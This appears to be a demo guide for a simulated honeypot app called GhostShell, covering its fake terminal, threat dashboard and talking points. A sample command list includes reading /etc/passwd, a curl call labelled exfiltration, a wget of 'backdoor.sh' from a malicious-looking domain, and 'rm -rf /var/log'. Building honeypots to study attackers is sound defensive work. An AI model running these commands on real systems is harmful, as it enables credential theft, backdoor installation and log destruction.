# GhostShell - Quick Demo Reference

## 🚀 Start Demo

```bash
npm install --legacy-peer-deps
npm run dev
```

Then open: **http://localhost:3000**

---

## 📍 Key Pages to Visit

### 1. **Home / Authentication** → `http://localhost:3000`
- Try "Console Access" tab
- Execute command like: `whoami` or `sudo -l`
- You'll be redirected to fake terminal

### 2. **Fake Terminal** → `http://localhost:3000/terminal`
- Simulated honeypot environment
- Type commands to test:
  - `help` - See available commands
  - `whoami` - Get user info
  - `sudo -l` - Check sudo privileges
  - `cat /etc/passwd` - View password file (simulated)
  - `nmap -sV localhost` - Network scan (simulated)
  - `clear` - Clear terminal
- Use arrow keys for command history

### 3. **Admin Dashboard** → `http://localhost:3000/admin`
- Real-time security metrics
- Risk distribution pie chart
- 24-hour attack timeline
- Threat classification breakdown
- Quick action buttons

### 4. **Live Sessions** → `http://localhost:3000/admin/sessions`
- List all honeypot sessions
- Color-coded by threat level:
  - 🟢 Green = Low
  - 🟡 Yellow = Medium
  - 🟠 Orange = High
  - 🔴 Red = Critical
- Click any session for details

### 5. **Session Details** → `http://localhost:3000/admin/sessions/session-001`
- Deep analysis of specific attack
- Risk progression chart
- Full command transcript
- Behavior tags
- Timeline of events

---

## 💡 Demo Talking Points

### Honeypot Concept
- "This system silently redirects suspicious users"
- "They think they're on a real server"
- "We log everything without alerting the attacker"

### Threat Intelligence
- "Each command is classified by threat type"
- "Show the 'Threat Classification' breakdown"
- "Explain MITRE ATT&CK categories"

### Risk Scoring
- "Every action increases the risk score"
- "Privilege escalation is worth +20 points"
- "Destructive commands are worth +25 points"

### Behavioral Analysis
- "We tag attackers as 'Script Kiddie' vs 'Advanced Attacker'"
- "Some are doing reconnaissance, others going straight for creds"
- "Patterns help us predict their next move"

### Deception Strategies
- "We show fake success to keep them engaged"
- "Sometimes we delay responses to seem realistic"
- "Some tools appear broken to track their troubleshooting"

---

## 🧪 Sample Sessions to Show

| Session | Risk | Threat | Best For |
|---------|------|--------|----------|
| **session-001** | 85 | HIGH | Showing escalation attempts |
| **session-002** | 45 | MEDIUM | Automated scanners |
| **session-003** | 120 | CRITICAL | Advanced multi-stage attacks |
| **session-004** | 32 | LOW | Script kiddies |

---

## 🎯 Demo Flow (5 minutes)

### Minute 1: Entry Point
1. Show home page at `/`
2. Explain "Console Access" detection
3. Click "Console Access" tab
4. Show how it detects bypass attempts

### Minute 2: Terminal
1. Navigate to `/terminal`
2. Try 2-3 commands: `whoami`, `sudo -l`, `cat /etc/passwd`
3. Explain that all output is fake/monitored

### Minute 3: Dashboard
1. Go to `/admin`
2. Show metrics: "4 attackers, 19 commands tracked"
3. Point out risk distribution (35% High, 35% Medium)
4. Show 24-hour timeline

### Minute 4: Session Monitoring
1. Click "Live Sessions"
2. Show color-coded threat levels
3. Click on session-003 (the critical one)

### Minute 5: Deep Dive
1. Show risk progression chart
2. Scroll through command transcript
3. Highlight behavior tags
4. Explain what deception strategies were used

---

## 🔑 Key Commands to Demonstrate

```bash
# Basic Info Gathering
whoami                  # Get user (shows: root)
id                      # Get user ID (shows: uid=0(root))
pwd                     # Current directory (shows: /root)

# Privilege Escalation (Risky)
sudo -l                 # Check sudo (shows: (ALL) ALL)
sudo su                 # Switch to root (shows: root@...)

# Credential Access (Critical)
cat /etc/passwd         # View password file
curl http://internal-api:8080/secrets  # API exfiltration

# Reconnaissance
ps aux                  # Process list
nmap -sV localhost      # Network scan

# Persistence (Dangerous)
wget http://malicious-domain.com/backdoor.sh

# Destructive (Alarm!)
rm -rf /var/log         # Log destruction
```

---

## 📊 Dashboard Stats to Mention

**Metrics to highlight:**
- **4** total attackers captured
- **3** currently active sessions
- **19** total commands analyzed
- **70.5** average risk score

**Threat Breakdown:**
- 5 reconnaissance attempts
- 3 credential access attempts
- 3 privilege escalation attempts
- 2 persistence attempts
- 2 destructive attempts

---

## 💬 Talking Points

### "Why Honeypots?"
> "Traditional security blocks attackers immediately. We study them instead—safely. Every command is logged and analyzed. We learn their tactics before they cause real damage."

### "How It Works"
> "When someone tries to bypass authentication via console, we redirect them silently. They see a real-looking Linux terminal. All responses are simulated. They have no idea they're being analyzed."

### "Risk Intelligence"
> "Not all commands are equal. A `whoami` command is harmless. But `sudo -l` followed by `cat /etc/passwd` followed by `wget backdoor.sh`—that's a pattern. That tells us their intent."

### "Behavioral Profiling"
> "Are they a script kiddie running automated scanners? Or a skilled attacker doing careful reconnaissance? We tag behaviors, build profiles, predict next moves."

---

## ⚠️ Key Points

- ✅ **No real compromise** - Everything is simulated
- ✅ **Safe to demo** - No actual system impact
- ✅ **Educational** - Learn honeypot concepts
- ✅ **Realistic** - Looks like real terminal
- ✅ **Detailed logs** - Full audit trail

---

## 🚨 Common Demo Questions Answered

**Q: Are these real attackers?**
A: No, all data is simulated for demonstration purposes.

**Q: Does it actually execute commands?**
A: No, responses are pre-configured to simulate execution.

**Q: Can it be deployed to production?**
A: This is a demo. Real honeypots need database, persistence, etc.

**Q: How do attackers get redirected?**
A: Detection of console bypass attempts triggers honeypot redirection.

**Q: What happens to real users?**
A: Normal users use the regular login form and never see honeypot.

---

## 🎨 Customization Ideas

- Add more sample sessions
- Modify command responses
- Change color theme
- Add custom risk scoring
- Create new threat categories
- Add more deception strategies

---

**Ready to Demo? Open http://localhost:3000 and start exploring!**
